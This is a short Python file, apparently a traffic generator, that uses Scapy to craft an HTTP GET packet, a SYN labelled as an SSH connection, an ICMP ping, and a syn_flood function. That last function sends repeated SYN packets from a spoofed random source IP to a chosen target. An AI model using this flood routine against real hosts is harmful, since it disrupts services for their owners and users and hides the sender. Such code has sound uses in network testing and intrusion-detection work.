from scapy.layers.inet import IP, TCP, ICMP
from scapy.packet import Raw
from scapy.sendrecv import send, sr1
from scapy.volatile import RandIP, RandShort


def http_get(target_ip, target_port=80):
    packet = IP(dst=target_ip) / TCP(dport=target_port) / Raw(load="GET / HTTP/1.1\r\nHost: example.com\r\n\r\n")
    send(packet, verbose=False)
    return packet


def ssh_connection(target_ip, target_port=22):
    packet = IP(dst=target_ip) / TCP(dport=target_port, flags="S")
    send(packet, verbose=False)
    return packet


def icmp_ping(target_ip):
    ip = IP(dst=target_ip)
    icmp = ICMP()
    packet = ip / icmp
    sr1(packet, timeout=2, verbose=False)
    return packet


def syn_flood(target_ip, target_port, num_of_packets):
    src_ip = str(RandIP())
    src_port = RandShort()
    ip = IP(src=src_ip, dst=target_ip)
    tcp = TCP(sport=src_port, dport=target_port, flags="S")
    packet = ip / tcp
    for i in range(num_of_packets):
        send(packet, verbose=False)
    return packet
